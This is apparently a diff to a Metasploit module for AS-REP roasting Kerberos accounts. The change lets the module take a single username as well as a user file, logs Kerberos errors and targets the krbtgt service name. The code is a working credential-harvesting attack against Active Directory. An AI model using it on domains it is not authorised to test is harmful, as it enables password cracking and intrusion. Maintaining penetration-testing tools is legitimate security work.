@@ -46,7 +46,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RHOSTS(nil, true, 'The target KDC, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html'),
         OptPath.new('USER_FILE', [ false, 'File containing usernames, one per line' ], conditions: %w[ACTION == BRUTE_FORCE]),
         OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
-        OptString.new('Rhostname', [ true, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
+        OptString.new('Rhostname', [ false, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
       ]
     )
     register_option_group(name: 'SESSION',
@@ -77,26 +77,36 @@ class MetasploitModule < Msf::Auxiliary
   def run_brute
     result_count = 0
     user_file = datastore['USER_FILE']
-    if user_file.nil?
-      fail_with(Msf::Module::Failure::BadConfig, 'User file must be specified when brute forcing')
+    username = datastore['USERNAME']
+    if user_file.blank? && username.blank?
+      fail_with(Msf::Module::Failure::BadConfig, 'User file or username must be specified when brute forcing')
+    end
+    if username.present?
+      begin
+        roast(datastore['USERNAME'])
+        result_count += 1
+      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
+        # User either not present, or requires preauth
+        vprint_status("User: #{username} - #{e}")
+      end
     end
     if user_file.present?
       File.open(user_file, 'rb') do |file|
         file.each_line(chomp: true) do |user_from_file|
           roast(user_from_file)
           result_count += 1
-        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError
+        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
           # User either not present, or requires preauth
+          vprint_status("User: #{user_from_file} - #{e}")
         end
       end
-      if result_count == 0
-        print_error('No users found without preauth required')
-      else
-        print_line
-        print_status("Query returned #{result_count} #{'result'.pluralize(result_count)}.")
-      end
+    end
+
+    if result_count == 0
+      print_error('No users found without preauth required')
     else
-      fail_with(Msf::Module::Failure::BadConfig, 'User file not found')
+      print_line
+      print_status("Query returned #{result_count} #{'result'.pluralize(result_count)}.")
     end
   end
 
@@ -138,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def roast(username)
     res = send_request_tgt(
-      server_name: datastore['Rhostname'],
+      server_name: "krbtgt/#{datastore['domain']}",
       client_name: username,
       realm: datastore['DOMAIN'],
       offered_etypes: etypes,
